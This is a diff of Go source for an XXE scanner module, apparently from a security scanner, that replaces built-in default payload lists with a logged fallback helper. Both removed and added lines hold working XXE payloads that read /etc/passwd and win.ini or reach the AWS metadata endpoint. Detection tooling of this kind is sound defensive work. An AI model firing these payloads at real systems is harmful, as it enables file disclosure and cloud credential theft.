@@ -182,27 +182,9 @@ func (m *XXEScanner) getFilePayloads() []xxeFilePayload {
 			return result
 		}
 	}
-	return defaultFilePayloads()
-}
-
-func defaultFilePayloads() []xxeFilePayload {
-	return []xxeFilePayload{
-		{
-			`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><data>&xxe;</data></root>`,
-			"root:x:0:0",
-			"/etc/passwd",
-		},
-		{
-			`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><root><data>&xxe;</data></root>`,
-			"",
-			"/etc/hostname",
-		},
-		{
-			`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root><data>&xxe;</data></root>`,
-			"[fonts]",
-			"c:/windows/win.ini",
-		},
-	}
+	payload.LogFallbackOnce("xxe")
+	p, ev, f := payload.MinimalXXEFilePayload()
+	return []xxeFilePayload{{payload: p, evidence: ev, file: f}}
 }
 
 func (m *XXEScanner) testFileRead(ctx context.Context, target *core.Target) *core.Finding {
@@ -286,22 +268,12 @@ func (m *XXEScanner) getSSRFPayloads() []xxeSSRFPayload {
 			return result
 		}
 	}
-	return defaultSSRFPayloads()
-}
-
-func defaultSSRFPayloads() []xxeSSRFPayload {
-	return []xxeSSRFPayload{
-		{
-			`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>`,
-			"ami-id",
-			"AWS Metadata",
-		},
-		{
-			`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>`,
-			"instance-id",
-			"AWS Metadata",
-		},
-	}
+	payload.LogFallbackOnce("xxe")
+	return []xxeSSRFPayload{{
+		payload:  `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>`,
+		evidence: "ami-id",
+		target:   "AWS Metadata",
+	}}
 }
 
 func (m *XXEScanner) testSSRFViaXXE(ctx context.Context, target *core.Target) *core.Finding {
